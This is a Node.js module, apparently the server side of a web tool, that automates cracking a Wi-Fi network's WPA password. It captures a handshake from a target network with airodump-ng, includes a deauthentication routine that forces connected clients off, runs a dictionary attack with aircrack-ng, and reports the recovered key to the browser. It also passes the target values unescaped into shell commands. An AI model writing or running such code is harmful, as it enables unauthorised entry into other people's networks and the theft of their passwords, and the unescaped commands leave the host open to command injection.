const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

let airodumpProcess = null;
let aireplayProcesses = [];
let io;
const outputFilePath = '/tmp/ngcrack_output/airodump-output.txt';
const WIFI_SCAN_OUTPUT_DIR = path.join('/tmp', 'ngcrack_output');
const WIFI_SCAN_FILE_PREFIX = 'capture';

function init(i) {
		io = i;
}

function executeCommand(command, args, outputFile) {
    // Specify the output file for standard out and standard error streams
    const out = fs.openSync(outputFile, 'a');
    const err = fs.openSync(outputFile, 'a');

    return spawn(command, args, {
        stdio: ['ignore', out, err], // Redirect stdout and stderr to the outputFile
        detached: true
    });
}

function monitorOutputFile(filePath, searchString) {
    // Use fs.watch to monitor the file for changes
    const watcher = fs.watch(filePath, (eventType, filename) => {
        if (eventType === 'change') {
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error(err);
                    return;
                }


                if (data.includes(searchString)) {
					io.emit('getPasswordMessage', `Handshake found, attempt cracking ...`);
					stopDeauth();
					getPasswordStop();
                    startCracking();
					watcher.close();
                }
            });
        }
    });
}

function getPasswordStart(TARGET_ESSID, CHANNEL, TARGET_BSSID) {
	io.emit('getPasswordMessage', `airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1`);

    const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1 | awk '/WPA handshake/' > /tmp/ngcrack_output/airodump-output.txt`;

    airodumpProcess = spawn(command, {
        shell: true
    });
	
	
	
	// Monitor the output file for handshake capture
    monitorOutputFile('/tmp/ngcrack_output/airodump-output.txt', 'WPA handshake'); // Adjust the search string as necessary
	io.emit('getPasswordMessage', `Waiting for WPA handshake...`);
	
	// Start deauthentication
    //deauthenticate(TARGET_ESSID, TARGET_BSSID);
}

function deauthenticate(TARGET_ESSID, TARGET_BSSID) {
    io.emit('getPasswordMessage', `Starting deauth ...`);
	io.emit('getPasswordMessage', `aireplay-ng --deauth 3 -a ${TARGET_BSSID} wlan1`);

	aireplayProcess = executeCommand('aireplay-ng', ['--deauth', '3', '-a', TARGET_BSSID, 'wlan1'], '/dev/null');
    aireplayProcesses.push(aireplayProcess);
}


function stopDeauth() {
    aireplayProcesses.forEach(process => {
        process.kill();
    });
    console.log('All deauthentication processes stopped');
}

function getPasswordStop() {
    if (airodumpProcess) {
        airodumpProcess.kill();
        console.log('airodump-ng process stopped');
    } else {
		console.log('Unable to kill airodump-ng');
	}
	
	
	exec(`killall aircrack-ng`);
	exec(`killall airodump-ng`);
}

function getPasswordResume() {
	
}

function getPasswordPause() {
	
}

function getLatestCapFile() {
  const files = fs.readdirSync(WIFI_SCAN_OUTPUT_DIR);
  const csvFiles = files
    .filter(file => file.startsWith(WIFI_SCAN_FILE_PREFIX) && file.endsWith('.cap'))
    .map(file => ({
      file,
      time: fs.statSync(path.join(WIFI_SCAN_OUTPUT_DIR, file)).mtime.getTime()
    }))
    .sort((a, b) => b.time - a.time);

  return csvFiles.length > 0 ? path.join(WIFI_SCAN_OUTPUT_DIR, csvFiles[0].file) : null;
}

function startCracking() {
    // Assuming the handshake file is named correctly and exists. This might need to be dynamically determined.
    const capFile = getLatestCapFile();
    const dictionaryPath = '/var/www/kozone/nodejs/dictionary/wifi_passwords.txt';
    
    exec(`aircrack-ng ${capFile} -w ${dictionaryPath}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`cracking error: ${error.message}`);
            return;
        }
		
		const dataString = stdout.toString();
		const match = dataString.match(/KEY FOUND! \[ (.*?) \]/);
		if (match && match[1]) {
			console.log(`Password found: ${match[1]}`);
			io.emit('getPasswordMessage', `Password found: ${match[1]}`);
			io.emit('getPasswordFound', `${match[1]}`);
		} else {
			console.log(`Password not found`);
			io.emit('getPasswordMessage', 'Password NOT found.');
			io.emit('getPasswordNotFound');
		}
    });
}

module.exports = { init, getPasswordStart, getPasswordStop, getPasswordPause, getPasswordResume };
